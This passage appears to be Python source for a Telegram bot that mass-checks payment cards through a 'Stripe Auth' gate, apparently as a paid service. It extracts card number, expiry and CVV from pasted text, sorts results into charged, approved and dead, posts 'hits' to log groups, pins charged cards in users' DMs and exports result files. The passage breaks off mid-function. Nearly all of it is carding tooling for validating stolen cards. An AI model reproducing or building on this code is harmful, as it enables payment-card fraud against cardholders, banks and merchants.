from live_emoji import plan_badge, dev_badge
from privacy import protect
import asyncio
import random
import re
import logging
import aiohttp
import time
import string
import psycopg2.extras
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIOGRAM IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters.callback_data import CallbackData

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, update_user_stats, get_db_connection, deduct_credits_atomic, increment_lifetime_stats
from bin import get_bin_info
from sub import get_premium_status

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STRIPE AUTH IMPORT (Handles its own proxy internally)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from mass_gates.stripeauth import process_stripe_auth

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & URLS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HIT_LOG_GROUP_ID = -1003912886127
EXTRA_CHARGED_GROUP_ID = -1004330894683
BUTTON_LOCK_SECONDS = 30
BOT = "https://t.me/CHKXWIZ3_BOT"

# ── CUSTOM EMOJI IDs (same as msh.py) ──
CUSTOM_CHARGED_EMOJI_IDS = [
    "5287658362660474522",
    "5287547831677112267",
    "5285373878145667586",
    "5287360712836928126",
    "5285024405246725814",
    "5335059614603945751",
    "5197350061012436657",
    "5307554373457440075",
    "5296742257146241213",
    "5285186510197381130",
    "5920279261217820923",
    "5920049201294610186",
    "5235630047959727475",
    "5402114808692626532",
    "5285181291812120474",
    "5283139309740765379",
    "5323415975444372303",
    "5323674506705785412",
    "6026218958900695642",
    "6026031174340579961",
    "6026088864341299395",
    "6023832365833392885",
    "5321167461280662157",
    "5364040533498932357",
    "5462902520215002477",
    "5800688138833629633",
    "5850479475652824718",
    "6170417452162225096",
    "6190572956293272876",
    "5321125250342083365",
    "5765013255709790048",
    "5192786142864356407",
    "5994295021040309628",
    "5231265132826343149",
    "6037083366438737901",
    "5348296214183950233",
    "5769120678963843265",
    "5274115261329322709",
    "5380111356227770863",
    "5206449705143262854",
    "5866429502426454515",
]

import itertools as _itertools
_charged_emoji_cycle = _itertools.cycle(CUSTOM_CHARGED_EMOJI_IDS)

def get_next_charged_emoji_id() -> str:
    return next(_charged_emoji_cycle)

CUSTOM_APPROVED_EMOJI_ID = "6100515480735321747"
CUSTOM_DECLINED_EMOJI_ID = "5273914604752216432"

MCHK_SESSIONS = {}
MCHK_SESSION_LOCKS = {}

# ── Session GC: prune stale sessions every 10 min to prevent memory leaks ─────
import threading as _mchk_threading
import time as _mchk_time

_MCHK_SESSION_MAX_AGE = 3600

def _cleanup_mchk_sessions():
    cutoff = _mchk_time.time() - _MCHK_SESSION_MAX_AGE
    dead = [sid for sid, s in list(MCHK_SESSIONS.items())
            if s.get('status') in ('<b>Sᴜᴍᴍᴀʀʏ</b>', '<b>Sᴛᴏᴘᴘᴇᴅ</b>') and s.get('start_time', 0) < cutoff]
    for sid in dead:
        MCHK_SESSIONS.pop(sid, None)
        MCHK_SESSION_LOCKS.pop(sid, None)

def _start_mchk_gc():
    def _loop():
        while True:
            _mchk_time.sleep(600)
            try: _cleanup_mchk_sessions()
            except Exception: pass
    _mchk_threading.Thread(target=_loop, daemon=True, name='mchk_gc').start()

_start_mchk_gc()

router = Router()

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MchkResultCallback(CallbackData, prefix="mchkr"):
    session_id: str
    result_type: str

class MchkStopCallback(CallbackData, prefix="mchks"):
    session_id: str

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD EXTRACTION FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})$',
        r'^(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})$',
        r'^(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})$',
        r'^(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})$',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]
    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            groups = match.groups()
            if len(groups) == 5 and pattern.startswith(r'^\/[a-zA-Z]+\s+'):
                cc, mm, yy, cvv = groups[1], groups[2], groups[3], groups[4]
            elif len(groups) == 4:
                cc, mm, yy, cvv = groups
            else:
                continue
            month = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return cc, month, yy, cvv
    return None

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:
                    cards.append(card_string)
    return cards

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def log_hit_to_mchk(user_id, username, first_name):
    try:
        with open("mchk.txt", "a", encoding="utf-8") as f:
            u_name = username if username else "None"
            f_name = first_name if first_name else "Unknown"
            f.write(f"{user_id}|{u_name}|{f_name}\n")
    except Exception as e:
        logging.error(f"Error writing to mchk.txt: {e}")

def is_session_stopped(session_id: str) -> bool:
    session = MCHK_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "<b>Sᴛᴏᴘᴘᴇᴅ</b>"

def is_buttons_locked(session_id: str) -> bool:
    session = MCHK_SESSIONS.get(session_id)
    if not session:
        return False
    elapsed = time.time() - session.get('start_time', 0)
    return elapsed < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    session = MCHK_SESSIONS.get(session_id)
    if not session:
        return 0
    elapsed = time.time() - session.get('start_time', 0)
    remaining = BUTTON_LOCK_SECONDS - elapsed
    return max(0, int(remaining) + 1)

def get_user_display(user_obj, plan_name):
    return f"{user_obj.first_name} ({plan_name})"

def build_user_link(user_obj) -> str:
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

async def get_anime_gif():
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7hx5S3yCjQ8I/giphy.gif"

async def get_user_plan_name(user_id):
    is_premium, _ = get_premium_status(user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                return row['plan'].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    else:
        return "FREE"

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT NOTIFICATION FUNCTIONS (UPDATED UI)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_name, price, currency="USD"):
    """Send hit log to group with msh.py style UI"""
    user_link = protect(build_user_link(user_obj))
    gateway_display = f"Sᴛʀɪᴘᴇ Aᴜᴛʜ | {price} {currency}"
    safe_response = html_escape(str(response_msg))
    safe_plan = html_escape(str(plan_name))

    caption = (
        f"<b><a href='https://t.me/broken_wiz'>[  ɧ ι 𝛕  ]</a></b> <b>➺ ᏟꮋꭺꭱƦᏽꭼꭰ</b> <tg-emoji emoji-id=\"{get_next_charged_emoji_id()}\">💎</tg-emoji>\n"
        f"<b>Gᴀᴛᴇ ➺</b> <b>{gateway_display}</b>\n"
        f"<b>Rᴀᴡ ➺</b> <code>{safe_response}</code> <tg-emoji emoji-id=\"5801044672658805468\">✨</tg-emoji>\n"
        f"<b>Usᴇʀ ➺</b> <b>{user_link}</b> {plan_badge(safe_plan)}"
    )
    
    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="𝘾𝙃𝙆 𝕏 [𝙒 𝙄 𝙕] ", url=BOT, style="primary",
        icon_custom_emoji_id="5445104308884370368")]
    ])

    try:
        await bot.send_message(
            chat_id=HIT_LOG_GROUP_ID,
            text=caption,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Error sending hit log: {e}")

async def send_approved_msg_to_user(
    bot: Bot, cc_formatted, response_msg, bin_data,
    user_obj, plan_name, currency="USD"
, time_take=0.0):
    """Send approved hit to user's DM (msh.py style)"""
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape("Sᴛʀɪᴘᴇ Aᴜᴛʜ")
    safe_response = html_escape(str(response_msg))
    gif_url = await get_anime_gif()
    user_link = build_user_link(user_obj)
    dev_link = dev_badge()
    user_display = f"{user_link} {plan_badge(str(plan_name))}"

    caption = (
        f"<b>Sᴛᴀᴛᴜs ➺ ᎪꮲꮲꭱƦꮎꮩꭼꭰ</b> "
        f"<tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>\n"
        f"<tg-emoji emoji-id=\"5989793276838812063\">💳</tg-emoji> ➺ <code>{html_escape(cc_formatted)}</code>\n"
        f"<b>Gᴀᴛᴇ ➺ {gateway_display}</b>\n"
        f"<b>Rᴀᴡ ➺ {safe_response}</b>\n"
        f"<b>Iɴꜰᴏ ➺</b> <code>{bin_scheme} - {bin_bank} - {bin_country}</code>\n"
        f"<b>Tɪᴍᴇ ➺ {float(time_take):.2f}s</b>\n"
        f"<b>Usᴇʀ ➺ {user_display}</b>\n"
        f"<b>Dᴇᴠ ➺ {dev_link}</b>"
    )

    try:
        await bot.send_animation(
            chat_id=user_obj.id,
            animation=gif_url,
            caption=caption,
            parse_mode="HTML",
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MCHK] Could not DM approved hit to user {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"Error sending approved message to DM: {e}")

async def send_charged_msg_to_user(
    bot: Bot, cc_formatted, response_msg, bin_data,
    user_obj, plan_name, currency="USD"
, time_take=0.0):
    """Send charged hit to user's DM with auto-pin (msh.py style)"""
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape("Sᴛʀɪᴘᴇ Aᴜᴛʜ")
    safe_response = html_escape(str(response_msg))
    gif_url = await get_anime_gif()
    user_link = build_user_link(user_obj)
    dev_link = dev_badge()
    user_display = f"{user_link} {plan_badge(str(plan_name))}"

    caption = (
        f"<b>Sᴛᴀᴛᴜs ➺ ᏟꮋꭺꭱƦᏽꭼꭰ</b> "
        f"<tg-emoji emoji-id=\"{get_next_charged_emoji_id()}\">💎</tg-emoji>\n"
        f"<tg-emoji emoji-id=\"5989793276838812063\">💳</tg-emoji> ➺ <code>{html_escape(cc_formatted)}</code>\n"
        f"<b>Gᴀᴛᴇ ➺ {gateway_display}</b>\n"
        f"<b>Rᴀᴡ ➺ {safe_response}</b>\n"
        f"<b>Iɴꜰᴏ ➺</b> <code>{bin_scheme} - {bin_bank} - {bin_country}</code>\n"
        f"<b>Tɪᴍᴇ ➺ {float(time_take):.2f}s</b>\n"
        f"<b>Usᴇʀ ➺ {user_display}</b>\n"
        f"<b>Dᴇᴠ ➺ {dev_link}</b>"
    )

    # Send to user's DM and auto-pin
    try:
        sent_msg = await bot.send_animation(
            chat_id=user_obj.id,
            animation=gif_url,
            caption=caption,
            parse_mode="HTML",
        )

        try:
            await bot.pin_chat_message(
                chat_id=user_obj.id,
                message_id=sent_msg.message_id,
                disable_notification=True
            )
            logging.info(f"[MCHK] Pinned charged card msg {sent_msg.message_id} in DM of user {user_obj.id}")
        except (TelegramForbiddenError, TelegramBadRequest) as pin_err:
            logging.warning(f"[MCHK] Could not pin charged card in DM of user {user_obj.id}: {pin_err}")
        except Exception as pin_err:
            logging.error(f"[MCHK] Unexpected error while pinning charged card: {pin_err}")

    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MCHK] Could not DM charged hit to user {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"Error sending charged DM: {e}")

    # Also send to the extra charged group log
    group_caption = caption.replace(user_link, protect(user_link))
    try:
        await bot.send_animation(
            chat_id=EXTRA_CHARGED_GROUP_ID,
            animation=gif_url,
            caption=group_caption,
            parse_mode="HTML",
        )
    except Exception as e:
        logging.error(f"Error sending HIT to extra group: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HTML ESCAPE IMPORT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from html import escape as html_escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE GENERATION (UPDATED UI)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    cards_list = []

    if result_type == "charged":
        cards_list = session.get('charged_cards', [])
        type_label = "ᏟꮋꭺꭱƦᏽꭼꭰ"
        type_emoji = "💎"
    elif result_type == "live":
        cards_list = session.get('approved_cards', [])
        type_label = "ᎪꮲꮲꭱƦꮎꮩꭼꭰ"
        type_emoji = "✅"
    elif result_type == "dead":
        cards_list = session.get('dead_cards', [])
        type_label = "Dᴇᴀᴅ"
        type_emoji = "❌"
    else:
        cards_list = (
            session.get('charged_cards', []) +
            session.get('approved_cards', []) +
            session.get('dead_cards', []) +
            session.get('error_cards', [])
        )
        type_label = "Aʟʟ"
        type_emoji = "📁"

    total_count = len(cards_list)
    user_display = get_user_display(user_obj, plan_name)

    lines = []
    lines.append(f"[᯼] Gᴀᴛᴇ ➺ Sᴛʀɪᴘᴇ Aᴜᴛʜ")
    lines.append("━━━━━━━━━━━━━━━━━━━")
    lines.append(f"   [◈] Rᴇsᴜʟᴛ ➺ {type_label} {type_emoji}")
    lines.append(f"   [ᱯ] Tᴏᴛᴀʟ ➺ {total_count}")
    lines.append("━━━━━━━━━━━━━━━━━━━")

    if total_count == 0:
        lines.append("⚠️ No cards found for this category")
    else:
        for card_data in cards_list:
            cc = card_data.get('card', 'N/A')
            response = card_data.get('response', 'N/A')
            bin_info = card_data.get('bin_info', {})

            scheme = bin_info.get('scheme', 'N/A')
            bank = bin_info.get('bank', 'N/A')
            country = bin_info.get('country', 'N/A')
            flag = bin_info.get('country_emoji', '')
            country_display = f"{country} {flag}" if flag else country

            if "CHARGED" in response.upper() or "charged" in response.lower():
                status = "ᏟꮋꭺꭱƦᏽꭼꭰ 💎"
            elif "INSUFFICIENT_FUNDS" in response.upper() or "insufficient" in response.lower():
                status = "ᎪꮲꮲꭱƦꮎꮩꭼꭰ ✅"
            elif "ERROR" in response.upper() or "TIMEOUT" in response.upper() or "error" in response.lower():
                status = "Eʀʀᴏʀ ⚠️"
            else:
                status = "Dᴇᴀᴅ ❌"

            lines.append(f"Sᴛᴀᴛᴜs ➺ {status}")
            lines.append(f"Cᴀʀᴅ ➺ {cc}")
            lines.append(f"Gᴀᴛᴇ ➺ Sᴛʀɪᴘᴇ Aᴜᴛʜ")
            lines.append(f"Rᴀᴡ ➺ {response}")
            lines.append(f"Bʀᴀɴᴅ ➺ {scheme}")
            lines.append(f"Issᴜᴇʀ ➺ {bank}")
            lines.append(f"Cᴏᴜɴᴛʀʏ ➺ {country_display}")
            lines.append(f"Usᴇʀ ➺ {user_display}")
            lines.append(f"Dᴇᴠ ➺ 𒉼 𝔦 乙")
            lines.append("━━━━━━━━━━━━━━━━━━━")

    content = "\n".join(lines)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename = f"WIZXCHK_STRIPEAUTH_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"

    return file_buffer, filename, total_count

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS & PROGRESS MESSAGE (UPDATED UI)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    session = MCHK_SESSIONS.get(session_id, {})
    approved_count = session.get('approved', 0)
    dead_count = session.get('dead', 0)
    charged_count = session.get('charged', 0)
    checked_count = session.get('checked', 0)

    buttons = []

    buttons.append([
        {
            "text": f"AᴘᴘƦᴏᴠᴇᴅ ({approved_count})",
            "callback_data": MchkResultCallback(session_id=session_id, result_type="live").pack(),
            "style": "success",
        },
        {
            "text": f"Dᴇᴄʟɪͷᴇᴅ ({dead_count})",
            "callback_data": MchkResultCallback(session_id=session_id, result_type="dead").pack(),
            "style": "danger",
        }
    ])

    buttons.append([
        {
            "text": f"CʜᴀƦɢᴇᴅ ({charged_count})",
            "callback_data": MchkResultCallback(session_id=session_id, result_type="charged").pack(),
            "style": "primary",
        },
        {
            "text": f"Tᴏᴛᴀʟ ({checked_count})",
            "callback_data": MchkResultCallback(session_id=session_id, result_type="all").pack(),
            "style": "primary",
        }
    ])

    if is_running:
        buttons.append([
            {
                "text": "Sᴛᴏᴘ sᴇsSɪᴏɴ",
                "callback_data": MchkStopCallback(session_id=session_id).pack(),
                "style": "danger",
            }
        ])

    return {"inline_keyboard": buttons}

async def update_progress_message(bot: Bot, session_id):
    session = MCHK_SESSIONS.get(session_id)
    if not session:
        return

    current_time = time.time()
    last_update = session.get('last_update_time', 0)
    is_finished = session['status'] == "<b>Sᴜᴍᴍᴀʀʏ</b>"
    is_stopped = session['status'] == "<b>Sᴛᴏᴘᴘᴇᴅ</b>"

    if not is_finished and not is_stopped and (current_time - last_update) < 1.0:
        return

    elapsed = current_time - session['start_time']
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    if session['status'] == "<b>Cʜᴇᴄᴋɪɴɢ…</b>":
        status_icon = "<tg-emoji emoji-id=\"5258077393884562645\">⬜️</tg-emoji>"
    elif session['status'] == "<b>Sᴛᴏᴘᴘᴇᴅ</b>":
        status_icon = "<tg-emoji emoji-id=\"5247149163132493357\">⛔️</tg-emoji>"
    else:
        status_icon = "<tg-emoji emoji-id=\"6253754970349243649\">✨</tg-emoji>"

    status_text = session['status']
    status_text = f"<b>{status_text}</b>"

    text = (
        f"<a href='https://t.me/broken_wiz'>[᯼]</a> <b>Gᴀᴛᴇ ➺</b> <b>Sᴛʀɪᴘᴇ Aᴜᴛʜ | Mass</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"      <a href='https://t.me/broken_wiz'>[◈]</a> <b>Sᴛᴀᴛᴜs ➺</b> {status_text} {status_icon}\n"
        f"      <a href='https://t.me/broken_wiz'>[ᱯ]</a> <b>Sᴇssɪᴏɴ ID ➺</b> <code>{session_id}</code>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>Cʜᴇᴄᴋᴇᴅ ➺</b> <code>「 {session['checked']}/{session['total']} 」</code>\n"        
        f"♘ <b>ᎪꮲꮲꭱƦꮎꮩꭼꭰ ➺</b> <b>{session['approved']} </b><tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>\n"
        f"♞ <b>ᏟꮋꭺꭱƦᏽꭼꭰ ➺</b> <b>{session['charged']} </b><tg-emoji emoji-id=\"5427168083074628963\">💎</tg-emoji>\n"
        f"<b>Dᴇᴄʟɪɴᴇᴅ ➺</b> <b>{session['dead']} </b><tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>\n"        
        f"<b>Eʀʀᴏʀ ➺</b> <b>{session['errors']} </b><tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji> \n"
        f"<b>Eʟᴀᴘsᴇᴅ ➺</b> <b>{elapsed_str}</b> <tg-emoji emoji-id=\"5258419835922030550\">🕔</tg-emoji> \n"
        f"<b>Dᴇᴠ ➺</b> <a href='https://t.me/broken_wiz'>𒉼 𝔦 乙</a> <tg-emoji emoji-id=\"5260681660189408650\">🏆</tg-emoji> <tg-emoji emoji-id=\"5429495925284296642\">🚬</tg-emoji> \n"
    )

    if session.get('last_text') == text:
        return

    if session_id not in MCHK_SESSION_LOCKS:
        MCHK_SESSION_LOCKS[session_id] = asyncio.Lock()

    async with MCHK_SESSION_LOCKS[session_id]:
        if session.get('last_text') == text:
            return

        is_running = session['status'] == "<b>Cʜᴇᴄᴋɪɴɢ…</b>"
        reply_markup = get_result_buttons(session_id, is_running=is_running)

        try:
            await bot.edit_message_text(
                chat_id=session['chat_id'],
                message_id=session['msg_id'],
                text=text,
                parse_mode="HTML",
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            session['last_text'] = text
            session['last_update_time'] = current_time
        except TelegramBadRequest as e:
            if "message is not modified" not in str(e).lower() and "message to edit not found" not in str(e).lower():
                logging.error(f"Error updating progress: {e}")
        except Exception as e:
            logging.error(f"Error updating progress: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MchkResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MchkResultCallback):
    try:
        session_id = callback_data.session_id
        result_type = callback_data.result_type

        session = MCHK_SESSIONS.get(session_id)
        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"⏳ Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        if result_type == "charged":
            count = len(session.get('charged_cards', []))
        elif result_type == "live":
            count = len(session.get('approved_cards', []))
        elif result_type == "dead":
            count = len(session.get('dead_cards', []))
        else:
            count = (
                len(session.get('charged_cards', [])) +
                len(session.get('approved_cards', [])) +
                len(session.get('dead_cards', [])) +
                len(session.get('error_cards', []))
            )

        if count == 0:
            type_names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
            await callback.answer(f"❌ No {type_names.get(result_type, '')} cards found", show_alert=True)
            return

        await callback.answer("📦 Generating report...", show_alert=False)

        user_obj = session.get('user_obj')
        plan_name = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')

        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)
        file_content = file_buffer.read()
        file_buffer.seek(0)

        type_emojis = {"charged": "💎", "live": "✅", "dead": "❌", "all": "📁"}
        type_labels = {"charged": "ᏟꮋꭺꭱƦᏽꭼꭰ", "live": "ᎪꮲꮲꭱƦꮎꮩꭼꭰ", "dead": "Dᴇᴄʟɪɴᴇᴅ", "all": "Aʟʟ"}

        caption = (
            f"<b>Rᴇsᴜʟt Tʏᴘᴇ ➺ {type_labels.get(result_type, '𝗔𝗹𝗹')} {type_emojis.get(result_type, '📁')}</b>\n"
            f"<b>Tᴏᴛᴀʟ Cᴀʀᴅs ➺ {total_count}</b>\n"
            f"<b>Gᴀᴛᴇ ➺ Sᴛʀɪᴘᴇ Aᴜᴛʜ | Mass</b>"
        )

        document = types.BufferedInputFile(file=file_content, filename=filename)

        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id,
                document=document,
                caption=caption,
                parse_mode="HTML",
                reply_to_message_id=user_msg_id
            )
        except TelegramBadRequest as e:
            if "message to reply not found" in str(e).lower():
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise

    except Exception as e:
        logging.error(f"Error handling MCHK result callback: {e}", exc_info=True)
        try:
